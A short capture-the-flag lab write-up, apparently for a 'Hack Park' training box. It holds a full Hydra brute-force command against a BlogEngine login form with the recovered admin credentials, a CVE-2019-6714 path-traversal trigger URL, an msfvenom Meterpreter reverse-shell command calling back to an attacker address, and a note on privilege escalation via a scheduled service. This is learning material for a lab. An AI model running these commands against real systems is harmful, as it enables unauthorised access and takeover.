# HACK PARK

# Brute Forcing Using Hydra

# We got the payload from the post page with Firefox.

```
__VIEWSTATE=WdwzZhn5eBO160NKfAmtvElayShtyClJMCjW02mLkZmMTN8dSWt%2BTKFcA0Ftr7SyloCSDA7LP%2FH2zUF5LdZMG%2FZkBt6S1V3XAPh6EMT97p7XRLaSgoI5%2F1deXegPVG0QHtrArhZx%2F5SuCa0Z7ITARs065u3TZ8B052Zq2ioPV9zsLY9g&__EVENTVALIDATION=E%2BLD8EXEWA0EzQnH1wNizXSBiGMG4Hr71bUOuHUZ%2B3XvAKkCSn%2B2O3SbfivqCD7MHVmiaXHgeuNtYsiAnzRf0cEhei7hn4W0r6L9axbeJ%2BIQsXx1kGZ0eK3ayXBNc7gs4yyaD%2BJHDTRkSKPRMKoPVrQxcEMEPNokF8MlFW95I97bbyst&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
```

# This is the Hydra command we have to use

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.135.193 http-post-form "/Account/login.aspx:__VIEWSTATE=WdwzZhn5eBO160NKfAmtvElayShtyClJMCjW02mLkZmMTN8dSWt%2BTKFcA0Ftr7SyloCSDA7LP%2FH2zUF5LdZMG%2FZkBt6S1V3XAPh6EMT97p7XRLaSgoI5%2F1deXegPVG0QHtrArhZx%2F5SuCa0Z7ITARs065u3TZ8B052Zq2ioPV9zsLY9g&__EVENTVALIDATION=E%2BLD8EXEWA0EzQnH1wNizXSBiGMG4Hr71bUOuHUZ%2B3XvAKkCSn%2B2O3SbfivqCD7MHVmiaXHgeuNtYsiAnzRf0cEhei7hn4W0r6L9axbeJ%2BIQsXx1kGZ0eK3ayXBNc7gs4yyaD%2BJHDTRkSKPRMKoPVrQxcEMEPNokF8MlFW95I97bbyst&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"

# We replaced the password=x and user=x fields with password=^PASS^, respectively

# CREDENTIALS FOUND: 
    admin:1qaz2wsx

# HYDRA CHEAT SHEET 
# https://i.imgur.com/P0ju4rH.png

# We used CVE-2019-6714 to exploit a bug in BlogEngine v3.3.6
    http://10.10.10.10/?theme=../../App_Data/files
    We have a shell.

# msfvenom reverse shell generation
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.2.87.252 LPORT=4455 -f exe > shell.exe

# Abused a service, uploaded a shell to replace the service that was scheduled to run every 30 seconds and got root.